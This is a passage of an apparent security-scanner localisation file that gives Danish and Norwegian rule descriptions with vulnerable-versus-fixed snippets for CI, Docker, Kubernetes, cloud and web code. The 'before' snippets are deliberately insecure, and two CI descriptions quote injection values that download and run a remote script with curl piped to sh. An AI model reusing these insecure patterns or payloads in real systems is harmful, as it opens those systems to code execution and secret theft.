      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # kun den mere specifikke rolle, der rent faktisk er nødvendig, ikke Owner på hele abonnementet\n}`,
    },
  },
  "weak-random-token": {
    title: "Et sikkerhedstoken genereres med en talgenerator, der ikke er kryptografisk sikker",
    description:
      "En værdi med et navn som token/session/reset/otp/csrf genereres med Math.random() (JS), random.random() (Python) eller rand() (PHP) — generatorer, der ikke er designet til sikkerhed, og hvis sekvenser kan forudsiges. Et token genereret på denne måde kan gættes eller rekonstrueres, hvilket underminerer formålet med, at det eksisterer (f.eks. et link til nulstilling af adgangskode, som alle kunne forudsige).",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto, ikke Math.random — uforudsigeligt`,
    },
  },
  "ldap-injection": {
    title: "Et LDAP-filter bygges ved direkte at sammenkæde en værdi fra anmodningen",
    description:
      'En linje, der bygger et LDAP-filter (f.eks. "(uid=...)"), inkluderer direkte en værdi taget fra anmodningen, uden nogen escaping af LDAP-specialtegn. Den, der kontrollerer den værdi, kan ændre filterets logik — for eksempel ved at omgå et godkendelsestjek eller læse directory-data, de ikke burde se.',
    fix: {
      before: `const filter = \`(uid=\${req.body.username})\`;\nclient.search(base, { filter });`,
      after: `const filter = \`(uid=\${ldapEscape(req.body.username)})\`; // LDAP-specialtegn skal altid escapes, før de bruges i et filter\nclient.search(base, { filter });`,
    },
  },
  "header-injection": {
    title: "En værdi fra anmodningen havner direkte i en HTTP-svarheader",
    description:
      "En HTTP-svarheader sættes med en værdi taget direkte fra anmodningen (query, body, params), uden at kontrollere, at den ikke indeholder et linjeskift (CRLF). En angriber kan indsætte ekstra headers eller endda et helt andet svar — response splitting — og dermed potentielt manipulere caching, cookies eller indholdet vist til andre brugere.",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "En tredjeparts CI-action er ikke låst til en præcis version (commit SHA)",
    description:
      'Workflowet bruger en tredjeparts action refereret via tag eller branch (f.eks. "@v1", "@main") i stedet for via commit SHA. Den, der vedligeholder den — eller den, der kompromitterer deres konto — kan flytte den reference til et andet commit når som helst, og dermed stille ændre, hvad der kører i CI\'en, med adgang til dens hemmeligheder. Et commit SHA peger altid på præcis den samme kode.',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1, låst til commit SHA'en — opdatér SHA'en, når du opdaterer versionen`,
    },
  },
  "gha-excessive-permissions": {
    title: "Workflowet giver sig selv alle token-tilladelser i stedet for kun dem, det bruger",
    description:
      '"permissions: write-all" giver workflowets GITHUB_TOKEN skriveadgang til alt — issues, pull requests, pakker, deployments — selv hvis workflowet kun bruger en del af det. Hvis et trin i workflowet bliver kompromitteret (en ondsindet afhængighed, et indsat script), øger de bredere tilladelser, hvad den, der udnytter det, kan gøre.',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # kun de tilladelser, workflowet rent faktisk bruger`,
    },
  },
  "insecure-cookie-flags": {
    title: "En session- eller godkendelsescookie er sat uden Secure- og HttpOnly-flagene",
    description:
      'En cookie med et navn, der minder om session/auth/token, er sat uden "httpOnly" og "secure" blandt dens indstillinger. Uden httpOnly kan JavaScript på siden — inklusive kode indsat via XSS — læse den cookie. Uden secure kan den også sendes over en ukrypteret HTTP-forbindelse.',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "Sårbar afhængighed:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "Ingen rettet version kendt endnu — overvej en alternativ pakke eller følg projektets opdateringer."
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "En hemmelighed er skrevet direkte i en ENV- eller ARG-instruktion i Dockerfilen",
    description:
      "En variabel med et navn som password/secret/token/key har en bogstavelig værdi i en ENV- eller ARG-instruktion. I modsætning til en .env-fil (som normalt ikke havner i imaget), bliver denne værdi bagt ind i selve Docker-imaget — alle, der kan pulle det eller inspicere layer-historikken, kan hente den igen, selv hvis linjen fjernes i en senere version af Dockerfilen.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# sendt med: docker build --build-arg DB_PASSWORD=*** (eller, endnu bedre,\n# et BuildKit secret mount, som aldrig havner i layer-historikken)`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfilen sætter ikke en ikke-root-bruger",
    description:
      "Ingen USER-instruktion i Dockerfilen: uden den kører containeren som root. Hvis en angriber formår at køre kode inde i containeren (f.eks. ved at udnytte et sårbart bibliotek), gør root inde i containeren en eventuel flugt til hosten — eller en bredere konsekvens for det omkringliggende system — nemmere.",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfilens basisimage bruger ":latest"-tagget',
    description:
      'En FROM-instruktion bruger eksplicit ":latest"-tagget i stedet for en præcis version. "latest" ændrer sig over tid: samme build, lavet igen på et andet tidspunkt, kan få en anden version af basisimaget — en ikke-reproducerbar build, og en uønsket opdatering kan ankomme, uden at nogen har besluttet, at den skulle.',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "Dockerfilen downloader en fjernfil med ADD i stedet for COPY",
    description:
      "En ADD-instruktion med en http/https-URL downloader en fil fra internettet under build'en, uden integritetstjek og uden at indholdet er synligt i repositoriet. Hvis den URL nogensinde bliver kompromitteret, trækker build'en vilkårligt indhold ind, uden at nogen bemærker det ved blot at læse Dockerfilen.",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<forventet hash>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "En container i Kubernetes-manifestet kører som privileged",
    description:
      '"privileged: true" i en containers securityContext deaktiverer næsten al den normale isolation mellem container og host: containeren kan tilgå hostens enheder, ændre dens netværkskonfiguration og i mange tilfælde reelt opnå root-adgang til den maskine, der kører den. Næsten aldrig nødvendigt for en normal app.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # kun de capabilities, der rent faktisk er nødvendige`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "En hemmelighed er skrevet i klartekst i en env-variabel i Kubernetes-manifestet",
    description:
      'En miljøvariabel med et navn som password/secret/token/key har en bogstavelig værdi ("value:") i stedet for at blive læst fra en Secret ("valueFrom.secretKeyRef"). Selve manifestet — ofte committet til et repository — indeholder derfor hemmeligheden i klartekst, synlig selv for nogen, der kun kan læse konfigurationen, ikke nødvendigvis køre kommandoer i klyngen.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "k8s-run-as-root": {
    title: "En container i Kubernetes-manifestet er sat til at køre som root",
    description:
      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvinger eksplicit containeren til at køre som root. Hvis en angriber formår at køre kode inde i containeren (f.eks. ved at udnytte et sårbart bibliotek), gør root inde i containeren en eventuel flugt til hosten — eller en bredere konsekvens — nemmere.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "En container i Kubernetes-manifestet kan opnå flere rettigheder, end den startede med",
    description:
      '"allowPrivilegeEscalation: true" i securityContext lader en proces inde i containeren opnå flere rettigheder end den proces, der startede den (f.eks. via en binær med setuid-bit). Kombineret med en sårbarhed i applikationen er det et skridt nærmere eksekvering af kode med flere rettigheder end tiltænkt.',
    fix: {
      before: `securityContext:\n  allowPrivilegeEscalation: true`,
      after: `securityContext:\n  allowPrivilegeEscalation: false`,
    },
  },
  "k8s-host-namespace-access": {
    title: "En pod i Kubernetes-manifestet deler hostens netværk, processer eller delte hukommelse",
    description:
      '"hostNetwork", "hostPID" eller "hostIPC" sat til true tager podden ud af dens normale isolation: hostNetwork eksponerer podden på hostens netværk (og omgår klyngens netværkspolitikker), hostPID giver den indsigt i alle processer på hostmaskinen, hostIPC giver den adgang til hostens delte hukommelse. Næsten aldrig nødvendigt for en normal app — typisk kun til lavniveau system-/overvågningsværktøjer.',
    fix: {
      before: `spec:\n  hostNetwork: true`,
      after: `spec:\n  hostNetwork: false`,
    },
  },
  "k8s-missing-run-as-non-root": {
    title: "Kubernetes-manifestet håndhæver ikke eksplicit kørsel som en ikke-root-bruger",
    description:
      'Intet "runAsNonRoot" nogen steder i manifestet (hverken på pod- eller containerniveau): uden at sætte det kører en container som den bruger, dens image definerer — ofte root som standard, hvis selve imaget ikke har ændret det. At sætte det eksplicit til true får podden til at fejle ved opstart, hvis imaget stadig prøver at køre som root, i stedet for først at opdage det efter en hændelse.',
    fix: {
      before: `containers:\n  - name: app\n    image: myapp:1.0`,
      after: `containers:\n  - name: app\n    image: myapp:1.0\n    securityContext:\n      runAsNonRoot: true`,
    },
  },
    "gitlab-ci-script-injection": {
      title: 'En værdi styret af en ekstern bruger passerer gennem en anden shell i GitLab CI-pipelinen',
      description: 'En "script:"-linje (eller "before_script:"/"after_script:") bruger "eval" eller "sh -c"/"bash -c" sammen med en foruddefineret GitLab-variabel som titlen på en merge request, commit-beskeden eller branchnavnet — alt sammen noget enhver, der åbner en merge request, kan skrive, selv fra en ekstern fork. Værdien udvides først af den ydre shell og indsættes derefter i en streng, som den anden shell igen fortolker som kode: en titel som "$(curl malware.sh | sh)" ville køre vilkårlige kommandoer i pipelinen med adgang til alle hemmeligheder tilgængelige i det job.',
      fix: {
        before: `script:
  - bash -c "deploy.sh $CI_MERGE_REQUEST_TITLE"`,
        after: `script:
  - deploy.sh "$CI_MERGE_REQUEST_TITLE"  # sendt som argument til kommandoen, aldrig inde i en "bash -c"-streng, der ville fortolke det igen`,
      },
    },
    "gitlab-ci-privileged-dind-no-tls": {
      title: 'Docker-in-Docker i GitLab CI-pipelinen kører med TLS-kryptering deaktiveret',
      description: 'Jobbet bruger tjenesten "docker:dind" (Docker-in-Docker, nødvendig for at bygge images inde i pipelinen), men sætter "DOCKER_TLS_CERTDIR" til en tom streng, hvilket deaktiverer TLS-krypteringen mellem Docker-klienten og dind-dæmonen helt. Uden TLS kan enhver, der kan nå den port på runnerens samme interne netværk, kontrollere Docker-dæmonen — der kører med udvidede rettigheder — i stedet for at være begrænset til det job, der skulle bruge den.',
      fix: {
        before: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: ""`,
        after: `services:
  - docker:dind
variables:
  DOCKER_TLS_CERTDIR: "/certs"  # TLS forbliver aktivt mellem Docker-klienten og dind-dæmonen — "" deaktiverer det helt`,
      },
    },
    "gitlab-ci-unpinned-image": {
      title: 'GitLab CI-pipelinens Docker-image er ikke fastlåst til en bestemt version',
      description: 'Et "image:" i pipelinen peger på et image uden tag (svarer til ":latest") eller eksplicit til ":latest". Den, der vedligeholder det image, kan udskifte dets indhold når som helst uden at repositoryet ændrer sig — den samme pipeline kan fra den ene dag til den anden begynde at køre anden kode, en forsyningskæderisiko, der konceptuelt er identisk med en GitHub Action, der refereres via tag i stedet for commit.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # et specifikt tag (eller endnu bedre et digest "node@sha256:...") i stedet for "latest"`,
      },
    },
},
  nb: {
  "supabase-service-role-in-client": {
    title: "Supabase sin hemmelige nøkkel havner i en fil beregnet på nettleseren",
    description:
      "En variabel med et offentlig prefiks (f.eks. NEXT_PUBLIC_, VITE_) eller en klientsidefil refererer til Supabase sin service role-nøkkel. Denne nøkkelen omgår Row Level Security: havner den i nettleserens bundle, kan hvem som helst lese den og opptre som databaseadministrator.",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (kun server)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "Passord eller hemmelige nøkler er skrevet direkte i koden",
    description:
      "En API-nøkkel, et token eller et passord ser ut til å være skrevet som en bokstavelig verdi i stedet for lest fra en miljøvariabel. Alle som leser kildekoden (eller repositoriet, hvis offentlig) får tak i den hemmeligheten.",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "En fil med prosjektets ekte passord er blant dem som analyseres",
    description:
      "En .env-fil med ekte verdier (ikke en .env.example) er inkludert i analysen. Havner denne filen i et repositorium eller en offentlig driftsetting, blir alle legitimasjonsopplysningene den inneholder eksponert.",
    fix: {
      before: `# .env (committet ved en feil)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (committet)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .env holdes utenfor repoet (.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "Hvem som helst kan lese eller endre alle brukeres data",
    description:
      "Row Level Security er deaktivert, eller en policy tillater tilgang for alle (USING (true)) uten å sjekke hvem som gjør forespørselen. Enhver autentisert bruker — eller til og med en anonym — kan lese eller endre alle andres data.",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "En verdi brukeren har skrevet inn limes direkte inn i en databasespørring",
    description:
      "En SQL-spørring bygges ved å sette sammen eller interpolere en streng direkte i stedet for å bruke parametere. Kommer den teksten (selv indirekte) fra en bruker, kan den endre selve spørringen — SQL-injeksjon.",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "Passordene ser ikke ut til å være beskyttet",
    description:
      "Et passordfelt lagres nøyaktig slik det kom inn i forespørselen, og ingen hash-funksjon (bcrypt, argon2, scrypt) finnes i filen. Blir databasen kompromittert, er alle passord umiddelbart brukbare.",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "Hemmeligheten brukt til å signere innlogginger er skrevet i klartekst i koden",
    description:
      "Hemmeligheten som sendes til jwt.sign / jwt.verify (eller variabelen JWT_SECRET) er en bokstavelig verdi i koden i stedet for å komme fra en miljøvariabel. Alle som leser den kan lage gyldige tilgangstokener for enhver bruker.",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "Serveren kan tvinges til å kjøre eksterne kommandoer",
    description:
      "En funksjon som kjører systemkommandoer (exec, execSync, spawn) mottar en streng bygget ved interpolering eller sammensetting. Kommer en del av denne strengen fra brukerinput, kan den som kontrollerer den kjøre vilkårlige kommandoer på serveren.",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "En fil på serveren kan leses eller skrives ved å velge stien utenfra",
    description:
      "En funksjon som leser, skriver eller sender en fil henter stien direkte fra en verdi i forespørselen (query, body, params) uten å sjekke at den holder seg innenfor en tillatt mappe. En angriper kan sette inn «../» for å komme ut av den tiltenkte mappen og lese eller overskrive vilkårlige filer på serveren (f.eks. en konfigurasjonsfil med legitimasjon).",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("Sti ikke tillatt")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "En verdi brukeren har skrevet inn kjøres som kode inne i en MongoDB-spørring",
    description:
      "MongoDBs $where-operator kjører JavaScript på serversiden for hvert dokument — er den strengen bygget ved å sette sammen en verdi som kommer fra brukeren, kan den som kontrollerer den få vilkårlig kode til å kjøre i databasens kontekst, ikke bare endre filteret som med en vanlig SQL-injeksjon.",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "En verdi brukeren har skrevet inn tolkes som en mal, ikke som data",
    description:
      "En funksjon som kompilerer/kjører en mal mottar HELE malen fra en verdi i forespørselen, i stedet for å bruke en fast mal og bare sende dataene. En angriper kan skrive direkte i malmotorens syntaks (f.eks. {{7*7}} for Jinja2) og kjøre kode på serveren — Server-Side Template Injection, som ofte fører til kjøring av vilkårlige kommandoer, ikke bare et visningsproblem som XSS.",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XML-parseren kan tvinges til å lese filer eller gjøre eksterne forespørsler",
    description:
      "En XML-parser (DocumentBuilderFactory) opprettes uten eksplisitt å deaktivere eksterne entiteter (DOCTYPE) i de nærmeste linjene. Mottar parseren XML fra en kilde den ikke kan stole på, kan en angriper definere en ekstern entitet for å lese filer på serveren eller få den til å kontakte en adresse etter eget valg — XML External Entity.",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "docker-hardcoded-secret": {
    title: "En hemmelighet er skrevet direkte i en ENV- eller ARG-instruksjon i Dockerfilen",
    description:
      "En variabel med et navn som password/secret/token/key har en bokstavelig verdi i en ENV- eller ARG-instruksjon. I motsetning til en .env-fil (som normalt ikke havner i bildet), bakes denne verdien inn i selve Docker-bildet — alle som kan hente det eller inspisere lag-historikken kan gjenopprette den, selv om linjen fjernes i en senere versjon av Dockerfilen.",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# sendes med: docker build --build-arg DB_PASSWORD=*** (eller, enda bedre,\n# en BuildKit secret mount, som aldri havner i lag-historikken)`,
    },
  },
  "k8s-privileged-container": {
    title: "En container i Kubernetes-manifestet kjører som privilegert",
    description:
      '"privileged: true" i en containers securityContext deaktiverer nesten all vanlig isolasjon mellom container og vert: containeren får tilgang til vertens enheter, kan endre nettverkskonfigurasjonen, og i mange tilfeller få effektiv root-tilgang til maskinen den kjører på. Nesten aldri nødvendig for en vanlig app.',
    fix: {
      before: `securityContext:\n  privileged: true`,
      after: `securityContext:\n  privileged: false\n  capabilities:\n    add: ["NET_BIND_SERVICE"]  # kun de capabilities som faktisk trengs`,
    },
  },
  "k8s-plaintext-secret-env": {
    title: "En hemmelighet er skrevet i klartekst i en miljøvariabel i et Kubernetes-manifest",
    description:
      'En miljøvariabel med et navn som password/secret/token/key har en bokstavelig verdi ("value:") i stedet for å bli lest fra en Secret ("valueFrom.secretKeyRef"). Selve manifestet — ofte committet til et repositorium — inneholder dermed hemmeligheten i klartekst, synlig selv for noen som bare kan lese konfigurasjonen, ikke nødvendigvis kjøre kommandoer i klyngen.',
    fix: {
      before: `env:\n  - name: DB_PASSWORD\n    value: supersecret123`,
      after: `env:\n  - name: DB_PASSWORD\n    valueFrom:\n      secretKeyRef:\n        name: db-credentials\n        key: password`,
    },
  },
  "terraform-open-security-group": {
    title: "En Terraform security group åpner en sensitiv port mot hele internett",
    description:
      'En regel med "cidr_blocks" som inkluderer 0.0.0.0/0 (alle IP-adresser) ligger nær en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # kun ditt private nettverk, eller en bastion host\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "En Google Cloud-brannmurregel åpner en sensitiv port mot hele internett",
    description:
      'En "google_compute_firewall"-ressurs med "source_ranges" som inkluderer 0.0.0.0/0 (alle IP-adresser) tillater trafikk til en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport (MySQL, Postgres, MongoDB, Redis, SQL Server). Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # kun ditt private nettverk, eller en bastion host\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "En Azure-nettverksregel åpner en sensitiv port mot hele internett",
    description:
      'En network security rule ("azurerm_network_security_rule", eller en "security_rule"-blokk inne i "azurerm_network_security_group") med "source_address_prefix" satt til "*" eller "0.0.0.0/0", retning "Inbound" og tilgang "Allow", nær en sensitiv port — SSH (22), RDP (3389), eller en typisk databaseport. Hvem som helst på internett kan prøve å koble til den tjenesten, ikke bare de som skal.',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # kun ditt private nettverk, eller en bastion host\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "En hemmelighet er skrevet som standardverdi for en Terraform-variabel",
    description:
      'En variabel med et navn som password/secret/token/key har en bokstavelig verdi i sin "default". I motsetning til en verdi som sendes ved kjøretid (tfvars, miljøvariabler TF_VAR_*), havner en default i kildekoden — og er repositoriet delt eller offentlig, ser alle den, selv uten tilgang til Terraform-tilstanden.',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # ingen default: send den med en .tfvars-fil (utenfor git) eller en miljøvariabel TF_VAR_db_password\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "En verdi kontrollert av en ekstern bruker går rett inn i en shell-kommando i CI",
    description:
      'En "run:"-kommando i en GitHub Actions-workflow interpolerer direkte en verdi som en pull request-tittel, et branch-navn eller teksten i en kommentar — alt skrivbart av hvem som helst som åpner en pull request eller kommentar, selv fra en ekstern fork. En verdi som `"; curl malware.sh | sh #` ville kjørt vilkårlige kommandoer i CI-en, med tilgang til alle hemmeligheter tilgjengelige i den workflowen.',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # sendt som miljøvariabel, aldri interpolert direkte i kommandoen`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "Workflowen kjører koden fra en ekstern pull request med tilgang til repositoriets hemmeligheter",
    description:
      'Workflowen bruker "pull_request_target" — som kjører med basisrepositoriets tillatelser og hemmeligheter selv for en pull request åpnet fra en ukjent fork — og gjør checkout av selve pull requestens kode ("github.event.pull_request.head"), ikke basisbranchen. Den som åpner pull requesten får dermed i praksis sin egen kode kjørt med tilgang til disse hemmelighetene.',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # Gjør checkout av basisbranchen, ikke PR-ens kode — eller bruk\n      # "pull_request" i stedet for "pull_request_target" hvis du ikke trenger\n      # de bredere tillatelsene/hemmelighetene.\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "Data fra forespørselen deserialiseres med et format som kan kjøre kode",
    description:
      "pickle (Python), unserialize() (PHP), ObjectInputStream (Java) eller biblioteket node-serialize (Node) deserialiserer en verdi hentet direkte fra forespørselen. I motsetning til JSON kan disse formatene representere og kjøre kode under selve deserialiseringen — den som kontrollerer verdien som sendes kan oppnå vilkårlig kodekjøring på serveren.",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSON kjører aldri kode under parsing, i motsetning til pickle`,
    },
  },
  "jwt-none-algorithm": {
    title: 'Koden godtar eksplisitt usignerte JWT-tokener (algoritme "none")',
    description:
      '"none" finnes blant algoritmene som godtas for å verifisere et JWT-token. Et token med algoritmen "none" har ingen signatur å verifisere: hvem som helst kan bygge ett med hvilket som helst innhold (f.eks. en admin-rolle), og koden ville godtatt det som gyldig.',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // inkluder aldri "none" blant de godtatte algoritmene`,
    },
  },
  "unprotected-new-table": {
    title: "En ny tabell ser ut til å bli opprettet uten beskyttelse",
    description:
      "En SQL-migrering oppretter en tabell, men aktiverer ikke Row Level Security for akkurat den tabellen i samme fil. Så lenge det forblir slik, starter tabellen uten noen begrensning på hvem som kan lese eller skrive til den.",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "Nettstedet godtar forespørsler fra alle andre nettsteder",
    description:
      "CORS-headeren er satt til å godta forespørsler fra alle origin (*), eller cors()-middlewaren brukes uten begrensninger. Ethvert tredjeparts nettsted kan kalle API-ene dine fra nettleseren til en allerede autentisert bruker.",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "En funksjon med adminrettigheter sjekker ikke hvem som bruker den",
    description:
      "En rute eller funksjon hvis navn tyder på adminoperasjoner inneholder ingen autentiserings- eller rollesjekk i de nærmeste linjene. Hvem som helst som kjenner URL-en kan kjøre den.",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "Nettstedet kan tvinges til å kjøre ekstern kode",
    description:
      "En utgående HTTP-forespørsel (fetch, axios) bruker direkte en verdi fra en brukers forespørsel som mål-URL. En ondsinnet bruker kan få serveren din til å kalle interne eller vilkårlige adresser — Server-Side Request Forgery.",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("URL ikke tillatt")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "Passordene beskyttes med en metode som nå er lett å knekke",
    description:
      "På samme linje brukes md5() eller sha1() på en verdi knyttet til et passord. Disse algoritmene er for raske å beregne: en angriper med databasen kan prøve milliarder av passord i sekundet.",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "k8s-run-as-root": {
    title: "En container i Kubernetes-manifestet er satt til å kjøre som root",
    description:
      '"runAsUser: 0" eller "runAsNonRoot: false" i securityContext tvinger eksplisitt containeren til å kjøre som root. Klarer en angriper å kjøre kode inne i containeren (f.eks. ved å utnytte et sårbart bibliotek), gjør root-tilgang inne i containeren en eskalering til verten — eller en bredere konsekvens — enklere.',
    fix: {
      before: `securityContext:\n  runAsUser: 0`,
      after: `securityContext:\n  runAsNonRoot: true\n  runAsUser: 1000`,
    },
  },
  "k8s-privilege-escalation": {
    title: "En container i Kubernetes-manifestet kan få flere privilegier enn den startet med",
    description:
